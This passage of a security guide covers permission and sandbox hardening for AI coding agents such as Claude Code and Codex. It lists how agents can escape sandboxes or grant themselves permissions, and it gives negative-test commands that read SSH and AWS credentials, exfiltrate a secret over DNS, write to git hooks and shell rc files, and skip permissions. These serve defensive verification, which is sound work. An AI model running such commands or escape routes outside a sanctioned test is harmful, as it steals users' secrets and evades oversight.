| Agent grants itself more permissions by editing config | (2025) CVE-2025-53773, see [Configuration security](configuration.md#security) | Protected paths: CC never auto-approves writes to `.git`, `.claude`, `.vscode`, `.idea`, `.husky`, shell rc files, `.mcp.json` outside bypass; Codex keeps `.git`, `.agents/`, `.codex/` read-only in writable roots. These cannot be exempted by `allowWrite` or `Edit` allow rules |
| Domain fronting through an allowed host | [CC sandboxing](https://code.claude.com/docs/en/sandboxing) | Narrow domains; TLS-terminating custom proxy |
| Sandbox escape through Docker socket, `$PATH` writes, excluded interpreters, `allowAppleEvents` | [CC sandboxing](https://code.claude.com/docs/en/sandboxing) | [Practice 7](#7-prefer-write-paths-over-command-exclusions-and-review-exclusions-like-sudo-grants) |
| MCP servers and hooks outside the command sandbox | [CC sandboxing](https://code.claude.com/docs/en/sandboxing); [Permissions concept](../concepts/permissions-and-sandbox.md) | Sandbox runtime or container; MCP allowlist ([MCP concept](../concepts/mcp.md)). Anthropic "does not security-audit or manage any MCP server" ([CC security](https://code.claude.com/docs/en/security)) |
| Package installs routed around an internal registry | [CC permission modes](https://code.claude.com/docs/en/permission-modes) | CC auto mode blocks this by default when an internal registry is declared |
| Repository config running before trust | See [Configuration security](configuration.md#security) | Trust gate, restricted loading |

Every CVE in the research exploited something running before or outside the permission system: startup hooks, MCP launch, base URL, config redirect, model-chosen cwd, auto-approved "safe" commands (inference). Verify those paths, not only the rule lists.

## Verification

Diagnostics:

- CC: `/permissions` lists rules by source file and has a "Recently denied" tab. `/sandbox` Config tab shows resolved protected paths ("Denied within allowed"). `claude doctor` flags sandbox misconfigurations such as "TLS termination is unavailable", unmatched `injectHosts`, ambiguous domain spellings and stale mask files.
- CC: to confirm an `excludedCommands` entry, switch to Manual mode and run a matching state-changing command; the prompt is titled "Bash command (unsandboxed)".
- Codex: `codex execpolicy check --pretty --rules <file> -- <command>` shows matching rules and the strictest decision. Add `match` and `not_match` examples to each rule as self-tests. `/permissions`, `/debug-config`, `codex doctor` show resolved state.
- Codex admins: "Test allowed and blocked workflows before rollout".

Negative tests (inference from the CVEs and documented limitations; each should be blocked or prompt):

1. Read `~/.ssh/id_*` and `~/.aws/credentials` via a shell command and via the file-read tool.
2. `curl` an off-allowlist host, then `/usr/bin/curl` and `sh -c 'curl ...'`.
3. `nslookup $(cat secret).example.com` (DNS exfiltration, CVE-2025-55284 class).
4. Write to `.claude/settings.json`, `.codex/config.toml`, `.git/hooks/` and `~/.zshrc`.
5. Force a sandbox failure and check whether an unsandboxed retry is offered.
6. Start with `--dangerously-skip-permissions` or `--yolo` and confirm policy refuses it.
7. Confirm `claude_code.tool_decision` or `codex.tool_decision` deny events reach the telemetry collector; `tool_use_id` and `prompt.id` correlate decisions with results ([CC monitoring](https://code.claude.com/docs/en/monitoring-usage), [Codex advanced config](https://learn.chatgpt.com/codex/config-advanced)).

Re-run after harness upgrades; defaults and precedence change between versions (for example CC v2.1.285 strict-sandbox precedence).

## Checklist

- [ ] Secret paths are denied in rules and in the sandbox (`denyRead` or `sandbox.credentials`; Codex profile or admin `deny_read`).
- [ ] Ask rules exist for `git push`, publish, deploy and infrastructure commands.
- [ ] No `Bash(*)`, interpreter, package-manager run, `docker` or `bash -c` allow rules.
- [ ] Sandbox is enabled with filesystem and network isolation, and fails closed (`failIfUnavailable`).
- [ ] Unsandboxed retry is disabled or forced to prompt.
- [ ] `excludedCommands`, `allowUnixSockets`, `allowWrite` and `writable_roots` entries are reviewed; no Docker socket, no `$PATH` or rc-file writes.
- [ ] Network allowlist has no broad domains such as `github.com`.
- [ ] Credentials reachable by commands are masked, denied or filtered.
- [ ] Automated reviewer, if used, runs on top of the sandbox.
- [ ] Bypass and yolo are disabled in policy or user settings, or used only inside a container or VM with restricted egress and no host secrets.
- [ ] No deprecated Codex `untrusted` or `on-failure` presets.
- [ ] The negative tests above were run after the last upgrade.

## Open questions

- **Independent evidence.** No non-vendor empirical study of approval-fatigue rates or classifier efficacy in coding agents was found; all numbers are vendor-measured.
- **Codex `approval_policy = "never"`:** what happens to a request that would need approval is not stated in the fetched pages.
- **Codex default read scope** for legacy sandbox modes is not documented; permission profiles (beta) can deny paths.
- **Sandbox strength.** No independent evaluation of Seatbelt or bubblewrap for coding agents, and no third-party sandbox-escape benchmark, was found.
- **Conformance tests.** Neither lead ships a security self-check for permission and sandbox posture.
- **OpenCode** has no documented OS sandbox and no incident data was found.

## Sources

- [Permissions and sandbox concept](../concepts/permissions-and-sandbox.md)
- [CC permissions](https://code.claude.com/docs/en/permissions)
- [CC permission modes](https://code.claude.com/docs/en/permission-modes)
- [CC sandboxing](https://code.claude.com/docs/en/sandboxing)
- [CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments)
- [CC devcontainer](https://code.claude.com/docs/en/devcontainer)
- [CC security](https://code.claude.com/docs/en/security)
- [CC monitoring](https://code.claude.com/docs/en/monitoring-usage)
- [Anthropic engineering, auto mode (Mar 25, 2026)](https://www.anthropic.com/engineering/claude-code-auto-mode)
- [Anthropic engineering, sandboxing (Oct 20, 2025)](https://www.anthropic.com/engineering/claude-code-sandboxing)
- [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security)
- [Codex rules](https://learn.chatgpt.com/codex/rules)
- [Codex sandboxing](https://learn.chatgpt.com/codex/sandboxing)
- [Codex auto-review](https://learn.chatgpt.com/codex/sandboxing/auto-review)
- [Codex cloud internet access](https://learn.chatgpt.com/codex/cloud/internet-access)
- [Codex managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration)
- [Codex advanced config](https://learn.chatgpt.com/codex/config-advanced)
- [OpenCode permissions](https://opencode.ai/docs/permissions/)
- [Docker Sandboxes](https://docs.docker.com/ai/sandboxes/)
- [trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config)
- [trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer)
- [Simon Willison, The lethal trifecta (Jun 16, 2025)](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)
- [Simon Willison, Designing agentic loops (Sep 30, 2025)](https://simonwillison.net/2025/Sep/30/designing-agentic-loops/)
- [Simon Willison, New prompt injection papers (Nov 2, 2025)](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/)
- [Meta AI, Agents Rule of Two (Oct 31, 2025)](https://ai.meta.com/blog/practical-ai-agent-security/)
- [GitLab advisory CVE-2025-55284](https://advisories.gitlab.com/pkg/npm/@anthropic-ai/claude-code/CVE-2025-55284/)
- [Embrace The Red: Claude Code exfiltration via DNS requests, CVE-2025-55284 (Aug 11, 2025)](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/)
- [NVD CVE-2025-59532](https://nvd.nist.gov/vuln/detail/CVE-2025-59532)
- [GitLab advisory CVE-2025-59532](https://advisories.gitlab.com/pkg/npm/@openai/codex/CVE-2025-59532/)
- [Wiz: s1ngularity supply-chain attack](https://wiz.io/blog/s1ngularity-supply-chain-attack)
- [StepSecurity: Nx compromise](https://www.stepsecurity.io/blog/supply-chain-security-alert-popular-nx-build-system-package-compromised-with-data-stealing-malware)
- [AWS security bulletin AWS-2025-015](https://aws.amazon.com/security/security-bulletins/AWS-2025-015/)
